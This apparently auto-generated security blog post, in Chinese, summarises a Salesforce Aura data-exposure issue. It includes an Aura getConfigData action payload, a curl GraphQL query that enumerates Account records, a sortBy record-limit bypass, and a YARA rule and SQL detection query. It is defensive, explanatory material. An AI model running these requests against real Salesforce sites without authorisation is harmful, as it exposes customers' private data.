---
layout: post
title:  "AuraInspector: Auditing Salesforce Aura for Data Exposure"
date:   2026-01-18 02:42:48 +0000
categories: [security]
severity: high
---

# 🔥 解析 Salesforce Aura 框架的資料外洩漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: 資料外洩 (Data Exposure)
> * **關鍵技術**: Salesforce Aura 框架、GraphQL、API 訪問控制

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Salesforce Aura 框架的訪問控制機制存在缺陷，允許未經授權的使用者存取敏感資料。
* **攻擊流程圖解**: 
    1. 攻擊者發現 Salesforce Experience Cloud 應用程式中存在 Aura 框架的端點。
    2. 攻擊者使用 GraphQL API 或 Aura 方法（如 `getConfigData` 或 `getItems`）來存取敏感資料。
    3. 攻擊者利用 `sortBy` 參數來繞過 2,000 條紀錄的限制，進一步擴大資料外洩的範圍。
* **受影響元件**: Salesforce Experience Cloud、Salesforce Aura 框架

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有 Salesforce Experience Cloud 應用程式的訪問權限。
* **Payload 建構邏輯**:

    ```
    
    json
    {
      "actions": [
        {
          "id": "123;a",
          "descriptor": "serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData",
          "callingDescriptor": "UNKNOWN",
          "params": {}
        }
      ]
    }
    
    ```
 

```

bash
curl -X POST \
  https://example.my.salesforce.com/services/data/v64.0/graphql \
  -H 'Content-Type: application/json' \
  -d '{
        "query": "query accounts { uiapi { query { Account { edges { node { Name { value } } } } } } }"
      }'

```
* **繞過技術**: 使用 `sortBy` 參數來繞過 2,000 條紀錄的限制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.my.salesforce.com |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule salesforce_aura_exploit {
      meta:
        description = "Salesforce Aura 框架資料外洩漏洞"
        author = "Your Name"
      strings:
        $graphql_query = "query accounts { uiapi { query { Account { edges { node { Name { value } } } } } } }"
      condition:
        $graphql_query
    }
    
    ```
 

```

sql
SELECT * FROM logs WHERE url LIKE '%/services/data/v64.0/graphql%' AND method = 'POST'

```
* **緩解措施**: 更新 Salesforce Experience Cloud 應用程式的訪問控制機制，限制未經授權的使用者存取敏感資料。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Salesforce Aura 框架**: 一種用於建立可重用、模組化元件的框架，作為 Salesforce Experience Cloud 的基礎技術。
* **GraphQL**: 一種用於 API 的查詢語言，允許用戶定義所需的資料結構。
* **API 訪問控制**: 一種機制，用于控制使用者存取 API 的權限。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://cloud.google.com/blog/topics/threat-intelligence/auditing-salesforce-aura-data-exposure/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


